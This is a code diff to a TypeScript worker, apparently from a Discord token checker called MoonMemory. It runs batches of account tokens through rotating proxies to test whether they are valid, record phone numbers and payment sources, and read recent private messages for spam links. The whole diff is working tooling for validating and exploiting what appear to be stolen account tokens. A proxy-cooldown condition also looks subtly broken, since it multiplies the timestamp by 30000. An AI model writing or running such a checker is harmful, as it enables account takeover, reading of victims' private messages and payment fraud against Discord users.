@@ -3,7 +3,12 @@ import { SocksProxyAgent } from 'socks-proxy-agent';
 import HttpsProxyAgent from 'https-proxy-agent';
 import { MessagePort } from 'worker_threads';
 import {PaymentMethod, ThreadChannelMessage, ThreadResult, toCheck, TokenBilling} from '@MoonMemory/types/IChecker.js';
-import { IDiscordBillingSource, IDiscordUser } from '@MoonMemory/types/DiscordInterfaces.js';
+import {
+	IDiscordBillingSource,
+	IDiscordDMChannel,
+	IDiscordMessage,
+	IDiscordUser
+} from '@MoonMemory/types/DiscordInterfaces.js';
 import { ProxyProvider, ProxyType, ProxyAgentPair } from '@MoonMemory/types/Proxy.js';
 import randomNumber from '@MoonMemory/utils/random.js';
 
@@ -19,7 +24,12 @@ function timeoutFetch( url: string, options: RequestInit, timeout = 10000 )
 
 function getProxyAgentPair( proxy: ProxyProvider ): ProxyAgentPair
 {
-	const randomProxy = proxy.proxies.filter( proxy => proxy.valid )[randomNumber( 0, proxy.proxies.length - 1 )];
+	const filtered = proxy.proxies.filter(
+		proxy =>
+			proxy && proxy.valid &&
+			( !( proxy.uses.length > 5 ) || new Date().getTime() * 30000 > new Date( proxy.uses.at( -1 )?.date ?? '' ).getTime() )
+	);
+	const randomProxy = filtered[randomNumber( 0, filtered.length - 1 )];
 	switch ( randomProxy.type )
 	{
 	case ProxyType.HTTP:
@@ -33,7 +43,7 @@ function getProxyAgentPair( proxy: ProxyProvider ): ProxyAgentPair
 	}
 }
 
-export default async ( { chunk, proxy, id, checklist, port }: { chunk: string[], proxy: ProxyProvider, id: number, checklist: toCheck[], port: MessagePort } ) =>
+export default async ( { chunk, proxy, id, checklist, spamUrls, port }: { chunk: string[], proxy: ProxyProvider, id: number, checklist: toCheck[], spamUrls: string[], port: MessagePort } ) =>
 {
 	let errors = 0;
 	let tokensValid: string[] = [];
@@ -53,14 +63,13 @@ export default async ( { chunk, proxy, id, checklist, port }: { chunk: string[],
 		try 
 		{
 			let valid = false;
-			let bil = false;
-			let phone = false;
 			let spam = false;
+			let user: IDiscordUser | null = null;
 			let payments: PaymentMethod[] = [];
 
 			if ( checklist.includes( toCheck.valid ) ) 
 			{
-				const userResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me', {
+				const userValidResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me/affinities/guilds', {
 					headers: {
 						Authorization: token
 					},
@@ -69,24 +78,40 @@ export default async ( { chunk, proxy, id, checklist, port }: { chunk: string[],
 
 				currentProxyAgentPair.proxy.uses.push( {
 					date: new Date(),
-					success: userResponse.ok,
-					status: userResponse.status
+					success: userValidResponse.ok,
+					status: userValidResponse.status
 				} );
 
-				if ( userResponse.ok ) 
+				if ( userValidResponse.ok )
 				{
 					valid = true;
 					tokensValid.push( token );
-					const user: IDiscordUser = await userResponse.json() as IDiscordUser;
-					if ( user.phone ) 
+
+					currentProxyAgentPair = getProxyAgentPair( proxy );
+
+					const userResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me', {
+						headers: {
+							Authorization: token
+						},
+						agent: currentProxyAgentPair.agent
+					} ) as Response;
+
+					currentProxyAgentPair.proxy.uses.push( {
+						date: new Date(),
+						success: userResponse.ok,
+						status: userResponse.status
+					} );
+
+					if ( userResponse.ok )
 					{
-						tokensPhones.push( token );
-						phone = true;
+						user = await userResponse.json() as IDiscordUser;
+						if ( user.phone ) tokensPhones.push( token );
 					}
+
 				}
 			}
 
-			if ( checklist.includes( toCheck.billing ) ) 
+			if ( checklist.includes( toCheck.billing ) && valid )
 			{
 				currentProxyAgentPair = getProxyAgentPair( proxy );
 				const billingResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me/billing/payment-sources', {
@@ -107,7 +132,6 @@ export default async ( { chunk, proxy, id, checklist, port }: { chunk: string[],
 					const billing: IDiscordBillingSource[] = await billingResponse.json() as IDiscordBillingSource[];
 					if ( billing.length > 0 ) 
 					{
-						bil = true;
 						for ( const payment of billing ) 
 						{
 							payments.push( {
@@ -125,19 +149,66 @@ export default async ( { chunk, proxy, id, checklist, port }: { chunk: string[],
 						} );
 					}
 				}
-
-				if ( checklist.includes( toCheck.is_spammed ) ) 
-				{
-					currentProxyAgentPair = getProxyAgentPair( proxy );
-					// TODO: Сделать проверку на спам
-				}
-
-				resolved++;
-				port.postMessage( {id, resolved, invalids, errors} as ThreadChannelMessage );
-				if ( !valid ) invalids++;
-				return true;
 			}
 
+			if ( checklist.includes( toCheck.is_spammed ) && valid )
+			{
+				currentProxyAgentPair = getProxyAgentPair( proxy );
+				const dmChannelsResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me/channels', {
+					headers: {
+						Authorization: token
+					},
+					agent: currentProxyAgentPair.agent
+				} ) as Response;
+
+				currentProxyAgentPair.proxy.uses.push( {
+					date: new Date(),
+					success: dmChannelsResponse.ok,
+					status: dmChannelsResponse.status
+				} );
+
+				if ( dmChannelsResponse.ok )
+				{
+					const channels: IDiscordDMChannel[] = await dmChannelsResponse.json() as IDiscordDMChannel[];
+					if ( channels.length > 10 ) channels.splice( 0, channels.length - 10 );
+					for ( const channel of channels )
+					{
+						currentProxyAgentPair = getProxyAgentPair( proxy );
+						const messagesInChannelResponse: Response = await timeoutFetch( `https://discord.com/api/v9/channels/${channel.id}/messages?limit=20`, {
+							headers: {
+								Authorization: token
+							},
+							agent: currentProxyAgentPair.agent
+						} ) as Response;
+
+						currentProxyAgentPair.proxy.uses.push( {
+							date: new Date(),
+							success: messagesInChannelResponse.ok,
+							status: messagesInChannelResponse.status
+						} );
+
+						if ( messagesInChannelResponse.ok )
+						{
+							const messages: IDiscordMessage[] = await messagesInChannelResponse.json() as IDiscordMessage[];
+							for ( const message of messages )
+							{
+
+								if ( spamUrls.some( url => message.content.includes( url ) ) )
+								{
+									spam = true;
+									tokensSpammed.push( token );
+									break;
+								}
+							}
+						}
+					}
+				}
+			}
+
+			resolved++;
+			port.postMessage( {id, resolved, invalids, errors} as ThreadChannelMessage );
+			if ( !valid ) invalids++;
+			return true;
 		}
 		catch ( e: any ) 
 		{
